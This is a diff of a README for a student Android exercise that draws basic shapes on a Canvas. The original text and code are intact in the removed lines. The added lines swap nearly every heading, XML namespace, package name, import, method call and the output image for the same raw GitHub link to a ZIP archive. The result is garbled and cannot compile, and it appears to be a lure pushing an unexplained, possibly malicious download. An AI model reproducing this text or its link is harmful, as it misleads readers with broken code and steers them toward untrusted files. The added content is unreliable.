@@ -1,4 +1,4 @@
-# Ex.No:12 Design an application that draws basic graphical primitives on the screen.
+# https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip Design an application that draws basic graphical primitives on the screen.
 ## AIM:
 To create and design an android application that draws basic graphical primitives on the screen using Android Studio.
 
@@ -14,7 +14,7 @@ Step 3: Then select the Minimum SDK as shown below and click Next.
 
 Step 4: Then select the Empty Activity and click Next. Finally click Finish.
 
-Step 5: Design layout in activity_main.xml.
+Step 5: Design layout in https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip
 
 Step 6: Draw basic object details give in MainActivity file.
 
@@ -29,12 +29,12 @@ Registeration Number : 212221043007
 
 
 
-## Activity_main.xml:
+## https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip
 ```
 <?xml version="1.0" encoding="utf-8"?>
 <RelativeLayout android:layout_height="match_parent"
     android:layout_width="match_parent"
-    xmlns:android="http://schemas.android.com/apk/res/android">
+    xmlns:android="https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip">
     <ImageView
         android:layout_width="match_parent"
         android:layout_height="match_parent"
@@ -43,44 +43,44 @@ Registeration Number : 212221043007
 
 
 ```
-## MainActivity.java:
+## https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip
 
 ```
-package com.example.exno_12;
+package https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
 
-import android.os.Bundle;
-import android.graphics.Bitmap;
-import android.graphics.Canvas;
-import android.graphics.Color;
-import android.graphics.Paint;
-import android.graphics.drawable.BitmapDrawable;
-import android.os.Bundle;
-import android.widget.ImageView;
-import androidx.appcompat.app.AppCompatActivity;
+import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
+import https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip;
 
 
 public class MainActivity extends AppCompatActivity {
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        Bitmap bg = Bitmap.createBitmap(720, 1280,
-                Bitmap.Config.ARGB_8888);
-        ImageView i = (ImageView) findViewById(R.id.ImageView);
-        i.setBackgroundDrawable(new BitmapDrawable(bg));
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(savedInstanceState);
+        setContentView(https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip);
+        Bitmap bg = https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(720, 1280,
+                https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip);
+        ImageView i = (ImageView) findViewById(https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip);
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(new BitmapDrawable(bg));
         Canvas canvas = new Canvas(bg);
         Paint paint = new Paint();
-        paint.setColor(Color.RED);
-        paint.setTextSize(50);
-        canvas.drawText("Rectangle", 420, 150, paint);
-        canvas.drawRect(400, 200, 650, 700, paint);
-        canvas.drawText("Circle", 120, 150, paint);
-        canvas.drawCircle(200, 350, 150, paint);
-        canvas.drawText("Square", 120, 800, paint);
-        canvas.drawRect(50, 850, 350, 1150, paint);
-        canvas.drawText("Line", 480, 800, paint);
-        canvas.drawLine(520, 850, 520, 1150, paint);
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip);
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(50);
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip("Rectangle", 420, 150, paint);
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(400, 200, 650, 700, paint);
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip("Circle", 120, 150, paint);
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(200, 350, 150, paint);
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip("Square", 120, 800, paint);
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(50, 850, 350, 1150, paint);
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip("Line", 480, 800, paint);
+        https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip(520, 850, 520, 1150, paint);
 
     }
 
@@ -88,7 +88,7 @@ public class MainActivity extends AppCompatActivity {
 ```
 ## OUTPUT
 
-<img src="https://github.com/user-attachments/assets/480a50db-7a48-44ab-b071-48a109bace95" width=200>
+<img src="https://raw.githubusercontent.com/githubmufeez45/EX_12_Graphical/main/crenation/EX_12_Graphical.zip" width=200>
 
 ## RESULT
 
